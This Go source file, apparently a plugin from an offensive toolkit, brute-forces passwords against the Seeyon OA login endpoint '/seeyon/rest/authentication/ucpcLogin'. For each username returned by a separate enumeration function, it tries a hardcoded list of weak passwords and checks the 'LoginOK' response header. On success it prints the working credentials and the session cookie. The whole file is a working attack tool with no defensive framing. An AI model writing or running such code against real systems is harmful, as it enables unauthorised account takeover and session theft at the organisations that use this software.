package plugin

import (
	"fmt"
	"net/http"
	"strings"
)

// BruteForcePasswords 开始对有效用户名进行密码爆破
func BruteForcePasswords(targetURL string) {
	users := GetValidUsers(targetURL) // 从 Boom_user 中获取有效的用户名
	for _, user := range users {
		bruteForcePass(targetURL, user)
	}
}

func bruteForcePass(targetURL, user string) {
	url := fmt.Sprintf("%s/seeyon/rest/authentication/ucpcLogin", targetURL)

	// 设置登录用户名
	postData := fmt.Sprintf("UserAgentFrom=iphone&login_username=%s&login_password=", user)

	passwords := []string{"123456", "a123456", "88888888", "1qaz@WSX", "1qaz2WSX"}

	client := &http.Client{}

	for _, password := range passwords {
		// 在每次循环中设置密码值
		req, _ := http.NewRequest("POST", url, strings.NewReader(postData+password))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		applyHeaders(req) // 确保你在这里有一个applyHeaders函数

		resp, _ := client.Do(req)
		defer resp.Body.Close()

		// 检查返回头中的LoginOK值
		loginOK := resp.Header.Get("LoginOK")
		if loginOK == "ok" {
			// 打印登录用户名和密码的值
			fmt.Printf("账号=%s, 密码=%s\n", user, password)

			// 打印Set-Cookie内容
			setCookie := resp.Header.Get("Set-Cookie")
			fmt.Printf("Set-Cookie: %s\n", setCookie)
		}
	}
}
